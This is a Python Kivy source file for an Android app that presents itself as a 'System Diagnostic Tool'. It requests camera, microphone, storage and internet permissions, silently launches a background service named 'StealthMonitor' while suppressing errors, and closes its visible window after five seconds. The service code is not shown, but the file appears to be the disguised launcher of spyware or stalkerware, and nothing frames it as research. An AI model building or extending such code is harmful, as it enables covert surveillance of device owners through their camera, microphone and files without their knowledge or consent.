import time
import threading
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.clock import Clock
from jnius import autoclass
from android import service
from android.permissions import request_permissions, Permission

Build = autoclass('android.os.Build')
VERSION = autoclass('android.os.Build$VERSION')
PowerManager = autoclass('android.os.PowerManager')
Context = autoclass('android.content.Context')

class MainApp(App):
    def build(self):
        self.ask_permissions()
        layout = BoxLayout(orientation='vertical', padding=20, spacing=10)
        info = (
            f"[b]System Diagnostic Tool[/b]\n\n"
            f"Device: {Build.MANUFACTURER} {Build.MODEL}\n"
            f"Android Version: {VERSION.RELEASE}\n"
            f"Status: Initializing services..."
        )
        label = Label(text=info, markup=True, halign='center', valign='middle')
        layout.add_widget(label)
        try:
            service.start_service('StealthMonitor', '')
        except Exception:
            pass
        Clock.schedule_once(lambda dt: self.stop(), 5)
        return layout

    def ask_permissions(self):
        perms = [
            Permission.CAMERA,
            Permission.WRITE_EXTERNAL_STORAGE,
            Permission.READ_EXTERNAL_STORAGE,
            Permission.INTERNET,
            Permission.RECORD_AUDIO
        ]
        request_permissions(perms)

if __name__ == '__main__':
    MainApp().run()
